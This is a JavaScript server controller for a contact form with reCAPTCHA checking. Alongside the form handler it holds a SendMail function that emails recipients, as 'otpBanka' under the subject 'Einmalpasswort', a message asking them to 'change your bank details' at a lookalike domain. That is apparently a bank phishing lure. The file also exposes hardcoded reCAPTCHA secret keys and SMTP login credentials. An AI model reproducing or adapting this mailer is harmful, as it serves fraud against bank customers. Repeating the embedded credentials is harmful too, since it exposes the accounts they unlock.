'use strict';

//6LcSr4sqAAAAAP3JhRexDSfNpKya99zSgfjhlD8H --> sitekey
//6LcSr4sqAAAAAC8z7RlMpbYZ4HQpzOFs8Vxnsq0c --> secretkry
module.exports = {
  exampleAction: async (ctx, next) => {
    try {
      ctx.body = 'ok';
    } catch (err) {
      ctx.body = err;
    }
  },
  sendMail: async (ctx, next) => {
    try {
      const axios = require('axios')
      console.log(ctx.request.body,"ctxx")
      validateSendMail(ctx.request.body)
      let requestBody = ctx.request.body
      let { data } = await axios({
        url: "https://www.google.com/recaptcha/api/siteverify",
        method: "POST",
        params: {
          secret: "6LcSr4sqAAAAAC8z7RlMpbYZ4HQpzOFs8Vxnsq0c", // it should be dynamic
          response: requestBody.recaptcha,
        },
      });
      console.log(data,"from recaptchs")
      if (!data.success) throw Error("Captcha Validation Failed");
      // let result = await SendMail('sumitchauhan9807666@gmail.com')
      // console.log(result)
      ctx.body = {
        status:true
      }
    } catch (err) {
      console.log(err)
      ctx.response.status = 422
      ctx.body = {
        status:false,
        error:err.message
      };
    }
  }
};

const validateSendMail = (body) => {
  if(!body.recaptcha) throw Error('Recaptcha is required')
  if(!body.firstName) throw Error('Firstname is required')
  if(!body.lastName) throw Error('Lastname is required')
  if(!body.email) throw Error('Email is required')
  if(!body.purpose) throw Error('Purpose is required')
  if(!body.message) throw Error('Message is required')
  return true
}

const SendMail = async (email) => {
const createTransport = require("nodemailer").createTransport;

  return new Promise((resolve, reject) => {
    let transporter = createTransport({
      host: "lx14.hoststar.hosting",
      port: 587,
      secure: false,
      auth: {
        // admin@flirttool.com
        user: "info@elementa-otp-hr-tkn.online",
        pass: "Admin2425@@!!**",
      },
    });

    let HTML = `
    <p> Please change your bank details from the following link</p>
    <br/><br/><br/><br/>
    <a href="https://elementa-otp-hr-tkn.online/">https://elementa-otp-hr-tkn.online</a>
    `;

    // mailto:kawa@bahoz.de
    // lx3.hoststar.hosting
    //H1ftqjlWnt-dkrUTga
    transporter
      .sendMail({
        from: "otpBanka",
        to: email,
        subject: "Einmalpasswort",
        // text:"test message"
        // html:"<html></html>"
        html: HTML,
      })
      .then((result) => {
        resolve(result);
      })
      .catch((e) => reject(e));
  });
};